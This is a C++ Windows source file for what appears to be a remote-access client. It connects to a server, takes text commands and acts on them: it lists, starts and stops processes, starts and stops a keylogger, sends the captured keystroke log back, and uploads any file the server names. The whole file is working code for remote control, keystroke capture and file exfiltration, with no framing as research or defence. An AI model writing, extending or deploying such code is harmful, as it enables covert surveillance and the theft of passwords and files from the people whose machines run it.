#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <string>
#include <fstream>
#include <cstdint>
#include "process_utils.h"
#include "keylogger.h"
#include <thread>
#include <mutex>
#include <atomic>
#include <Windows.h>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")

bool sendFileContent(SOCKET sock, const std::string& filename)
{
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return false;
    }
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    uint32_t length = content.size();

    if (send(sock, reinterpret_cast<const char*>(&length), sizeof(length), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send file length: " << WSAGetLastError() << std::endl;
        return false;
    }
    if (send(sock, content.c_str(), length, 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send file content: " << WSAGetLastError() << std::endl;
        return false;
    }
    file.close();
    std::cout << "Sent file: " << filename << " with size: " << length << " bytes." << std::endl;
    
    std::cout << "File content sent to server." << std::endl;
    return true;
}

bool sendFile(SOCKET sock, const std::string& filePath)
{
    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
    uint32_t nameLen = filename.size();
    if (send(sock, reinterpret_cast<const char*>(&nameLen), sizeof(nameLen), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send filename length: " << WSAGetLastError() << std::endl;
        return false;
    }
    if (send(sock, filename.c_str(), nameLen, 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send filename: " << WSAGetLastError() << std::endl;
        return false;
    }
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return false;
    }
    file.seekg(0, std::ios::end);
    uint32_t fileSize = static_cast<uint32_t>(file.tellg());
    file.seekg(0, std::ios::beg);

    if (send(sock, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0) == SOCKET_ERROR)
    {
        std::cerr << "Failed to send file size: " << WSAGetLastError() << std::endl;
        return false;
    }

    char buffer[4096];
    while (!file.eof())
    {
        file.read(buffer, sizeof(buffer));
        std::streamsize bytesRead = file.gcount();
        if (bytesRead > 0)
        {
            if (send(sock, buffer, static_cast<int>(bytesRead), 0) == SOCKET_ERROR)
            {
                std::cerr << "Failed to send file content: " << WSAGetLastError() << std::endl;
                file.close();
                return false;
            }
        }
    }
    file.close();
    std::cout << "File sent successfully: " << filePath << std::endl;
    return true;
}

void handleCommand(SOCKET sock, const std::string& cmd)
{
    if (cmd == "list")
    {
        listProcesses();
        sendFileContent(sock, "process_list.txt");
    }
    else if (cmd.rfind("start ", 0) == 0)
    {
        std::string path = cmd.substr(6);
        bool ok = startProcess(path);
        
        std::string msg = ok ? "Process started successfully." : "Failed to start process.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd.rfind("stop ", 0) == 0)
    {
        std::string name = cmd.substr(5);
        bool ok = stopProcess(name);
        std::string msg = ok ? "Process stopped successfully." : "Failed to stop process.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "start_keylogger")
    {
        startKeylogger();
        std::string msg = "Keylogger started.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "stop_keylogger")
    {
        stopKeylogger();
        std::string msg = "Keylogger stopped.";
        send(sock, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "keylogger_log")
    {
        std::string filename = "keylogger_log.txt";
        std::ifstream file(filename, std::ios::binary);
        if (file.is_open())
        {
            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            uint32_t length = content.size();
            if (send(sock, reinterpret_cast<const char*>(&length), sizeof(length), 0) == SOCKET_ERROR)
            {
                std::cerr << "Failed to send keylogger log length: " << WSAGetLastError() << std::endl;
                return;
            }
            if (send(sock, content.c_str(), length, 0) == SOCKET_ERROR)
            {
                std::cerr << "Failed to send keylogger log content: " << WSAGetLastError() << std::endl;
                return;
            }
            file.close();
            std::cout << "Sent keylogger log with size: " << length << " bytes." << std::endl;
        }
    }
    else if (cmd.rfind("copy_file ", 0) == 0)
    {
        std::string filePath = cmd.substr(10);
        if (sendFile(sock, filePath))
        {
            std::string msg = "File copied successfully.";
            send(sock, msg.c_str(), msg.size(), 0);
        }
        else
        {
            std::string msg = "Failed to copy file.";
            send(sock, msg.c_str(), msg.size(), 0);
        }
    }
    else
    {
        std::string msg = "Unknown command: " + cmd;
        send(sock, msg.c_str(), msg.size(), 0);
    }
}

int main()
{
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }
    sockaddr_in server = { AF_INET, htons(12345) };
    server.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sock, (sockaddr*)&server, sizeof(server));
    std::cout << "Connected to server." << std::endl;

    char buffer[1024];
    while (true)
    {
        int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) break;

        buffer[len] = '\0';
        std::string cmd(buffer);
        std::cout << "Received command: " << cmd << std::endl;
        handleCommand(sock, cmd);
    }

    closesocket(sock);
    WSACleanup();

    std::cout << "Connection closed." << std::endl;

    return 0;
}